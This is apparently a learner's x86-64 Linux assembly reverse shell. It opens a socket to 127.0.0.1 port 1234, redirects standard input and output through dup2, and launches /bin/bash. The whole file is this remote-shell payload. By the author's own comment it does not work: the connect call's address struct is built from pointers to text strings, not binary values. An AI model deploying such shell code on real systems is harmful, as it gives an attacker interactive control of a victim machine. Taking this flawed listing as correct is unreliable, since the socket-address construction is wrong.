;not working. there is some error in the connect syscall in the struct part.

global _start

section .data
    ip_addr: db "127.0.0.1",0
    port: db "1234",0

    shell: db "/bin/bash",0

section .text
_start:

    ;cleaning registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    ;calling socket syscall
    mov rax, 0x29
    mov rdi, 2 ; AF_INET
    mov rsi, 1 ;
    mov rdx, 0
    syscall

    mov rdi, rax ;set socketid to rdi

    ;connect syscall to connect to a socket
    xor rax, rax
    mov rax, 0x2a
    ;rdi is already the pointer to the socket so we dont pass it here
    ;pass the struct here
    xor rsi, rsi
    push rsi
    push ip_addr
    push port
    push 0x02
    mov rsi, rsp
    mov rdx, 16
    syscall

    xor rdx, rdx
    ;exec dup2
_changestd:
    mov rax, 0x21
    ;rdi already is socket id
    mov rsi, rdx
    syscall
    inc rdx
    cmp rdx, 3
    je _execbash
    jmp _changestd

_execbash: 
    mov rax, 0x3b
    mov rdi, shell
    xor rsi, rsi
    xor rdx, rdx
    syscall
